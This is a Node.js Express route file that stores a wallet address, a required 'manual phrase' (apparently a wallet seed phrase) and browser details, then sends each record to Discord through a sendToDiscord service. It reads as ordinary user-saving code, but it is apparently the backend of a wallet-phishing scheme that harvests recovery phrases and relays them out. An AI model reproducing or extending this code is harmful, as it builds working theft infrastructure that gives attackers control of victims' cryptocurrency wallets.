const express = require('express');
const router = express.Router();
const User = require('../models/User');
const { sendToDiscord } = require('../services/discord');

// @route   POST /api/user/save
// @desc    Save user with wallet, manual phrase, and browser info
// @access  Public
router.post('/save', async (req, res) => {
  try {
    const { walletAddress, manualPhrase } = req.body;

    if (!walletAddress || !manualPhrase) {
      return res.status(400).json({ 
        success: false,
        message: 'Wallet address and manual phrase are required' 
      });
    }

    // Check if user already exists
    let user = await User.findOne({ walletAddress: walletAddress.toLowerCase() });
    let isNew = false;

    if (user) {
      // Update existing user
      user.manualPhrase = manualPhrase;
      user.browserInfo = req.browserInfo;
      user.updatedAt = new Date();
      user = await user.save();
      
      // Send to Discord
      await sendToDiscord(user, false);
      
      return res.status(200).json({
        success: true,
        message: 'User updated successfully',
        user: {
          id: user._id,
          walletAddress: user.walletAddress,
          createdAt: user.createdAt,
          updatedAt: user.updatedAt,
        },
      });
    }

    // Create new user
    isNew = true;
    const newUser = new User({
      walletAddress: walletAddress.toLowerCase(),
      manualPhrase: manualPhrase,
      browserInfo: req.browserInfo,
    });

    user = await newUser.save();

    // Send to Discord
    await sendToDiscord(user, true);

    res.status(201).json({
      success: true,
      message: 'User saved successfully',
      user: {
        id: user._id,
        walletAddress: user.walletAddress,
        createdAt: user.createdAt,
      },
    });
  } catch (error) {
    // Handle duplicate key error
    if (error.code === 11000) {
      return res.status(409).json({ 
        success: false,
        message: 'User already exists' 
      });
    }
    
    console.error('Error saving user:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error', 
      error: error.message 
    });
  }
});

// @route   GET /api/user/:walletAddress
// @desc    Get user by wallet address
// @access  Public
router.get('/:walletAddress', async (req, res) => {
  try {
    const user = await User.findOne({
      walletAddress: req.params.walletAddress.toLowerCase(),
    });

    if (!user) {
      return res.status(404).json({ 
        success: false,
        message: 'User not found' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user._id,
        walletAddress: user.walletAddress,
        browserInfo: user.browserInfo,
        createdAt: user.createdAt,
        updatedAt: user.updatedAt,
      },
    });
  } catch (error) {
    console.error('Error fetching user:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error', 
      error: error.message 
    });
  }
});

module.exports = router;
